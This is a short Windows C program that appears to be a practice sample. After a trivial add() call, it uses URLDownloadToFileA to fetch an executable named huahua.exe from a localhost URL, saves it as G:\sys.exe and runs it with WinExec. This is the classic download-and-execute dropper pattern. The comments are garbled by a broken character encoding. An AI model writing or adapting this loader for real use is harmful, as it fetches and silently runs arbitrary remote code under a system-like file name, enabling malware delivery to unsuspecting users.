#include<stdio.h>
#include<stdlib.h>
#include<Windows.h>
#include<urlmon.h>

//ѡ���Զ���⣬ȫ·����Դ�ļ�Ŀ¼

#pragma comment(lib,"Urlmon.lib")				//����ϵͳ��
#pragma comment(lib,"runtest.lib")				//�����Զ����

int main(){
	printf("%d", add(1, 2));
	URLDownloadToFileA(NULL, "http://127.0.0.1/huahua.exe", "G:\\sys.exe", 0, NULL);
	WinExec("G:\\sys.exe", SW_SHOW);			//����Ӧ�ó���							

	getchar();
	return 0;
}